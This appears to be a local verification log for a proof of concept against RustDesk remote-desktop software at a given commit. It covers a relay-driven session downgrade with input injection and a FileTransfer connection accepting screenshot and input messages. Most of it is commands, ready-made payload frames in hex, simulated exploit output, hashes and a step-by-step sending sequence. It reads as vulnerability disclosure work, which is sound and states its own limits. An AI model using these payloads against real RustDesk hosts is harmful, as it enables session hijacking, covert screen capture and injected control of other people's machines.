# Local Verification

RustDesk source checkout:

ff226f6d8013dee2de5a6553abaf67bf32b3e875

No third-party host was contacted. The session downgrade proof uses a local loopback relay simulation. The FileTransfer proof verifies the vulnerable source shape and emits protocol message bodies for an authorized test session.

## Session Downgrade

Command:

cargo run -- --repo-root C:\path\to\rustdesk --out .\payloads

Output:

00_client_empty_downgrade_handshake.frame: 1 bytes, hex=00
01_login_remote_control.frame: 118 bytes, hex=d1013a720a0931323334353637383912204664ba509681b4355b18c1fb2137749c564691ac4e66e8091984e0cce606683e222072656c61792d61747461636b65722d63616e6e6f742d67756573732d746869732a116c65676974696d6174652d636c69656e745a05312e342e336a0777696e646f7773
02_injected_mouse_move.frame: 9 bytes, hex=20520610800518e003
03_injected_screenshot_request.frame: 37 bytes, hex=90ea0121121f706f632d646f776e6772616465642d72656c61792d73637265656e73686f74
  relay parsed LoginRequest without password knowledge: true
  relay injected MouseEvent as plaintext RustDesk frame: true

local exploit simulation:
  source checks passed: true
  client sent empty downgrade handshake: true
  relay observed plaintext login: true
  relay injected plaintext mouse frame: true
  controlled side authorized login: true
  controlled side accepted injected mouse event: true

Payload hashes:

6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D  00_client_empty_downgrade_handshake.frame
69DD5DA57D22B5DBFBA6B704951062DEADED3942772756918583D9864A3D594E  01_login_remote_control.frame
3171F71B0409374A2450FF74DF8CAFAD89B760D7CAE05AC81588FABD165972E4  02_injected_mouse_move.frame
BE7FBF25E7B0419CA62B2DE02D63BD5769BF7714F48C69CBCA50438B5BA2F0FF  03_injected_screenshot_request.frame

## FileTransfer Authorization Scope

Command:

cargo run -- --repo-root C:\path\to\rustdesk --out .\payloads --peer-id 123456789 --my-id 987654321 --my-name poc-controller --password "CorrectHorseBatteryStaple!" --salt "sample-server-salt" --challenge "123456"

Output:

01_login_filetransfer.bin: 92 bytes, hex=3a5a0a0931323334353637383912204664ba509681b4355b18c1fb2137749c564691ac4e66e8091984e0cce606683e22093938373635343332312a0e706f632d636f6e74726f6c6c65725a05312e342e336a0777696e646f77733a00
02_screenshot_request.bin: 32 bytes, hex=ea011d121b706f632d66696c657472616e736665722d73637265656e73686f74
03_capture_display0.bin: 9 bytes, hex=9a0106f201031a0100
04_mouse_left_click.bin: 10 bytes, hex=5208080110800518e003
05_key_return_press.bin: 8 bytes, hex=7a0610014801181b

PoC payloads written to .\payloads
Use only against a RustDesk host you own/control. The sequence is:
1. complete the normal transport/key exchange and receive Hash(salt, challenge)
2. send 01_login_filetransfer.bin with a valid password proof
3. after LoginResponse success, send screenshot/capture/input payloads
The source verifier confirmed this commit accepts these post-auth messages on a FileTransfer connection without rechecking AuthConnType::Remote.

Payload hashes:

67DFBD05D5B5F8F7D2A1DCA6CE7E3038DAADD86B9B4A9EA57958C1C5BD8F5B34  01_login_filetransfer.bin
2051A74FD909D2F721927FBF63A7C51FF93FEA8F234130763316F9BDCADBF03B  02_screenshot_request.bin
0547F9061C5BC107B19D885AC9D187C86E7C07ECC60E77FBE99CCB9A4A81D90D  03_capture_display0.bin
F99E0557BC4087C6D2936F60D68068A296A397FDDC08D6A6326E127B629A4FAF  04_mouse_left_click.bin
B5656BFE818D514F3175E6D46B324436FF6961DC093D3E949CA458104C3593A0  05_key_return_press.bin

## Claim Boundaries

The session downgrade proof requires a relay/rendezvous attacker position and a legitimate login. It does not prove password recovery, authentication bypass, or remote code execution.

The FileTransfer proof requires a valid FileTransfer authorization. It does not prove unauthenticated access and does not include a full live replay client.
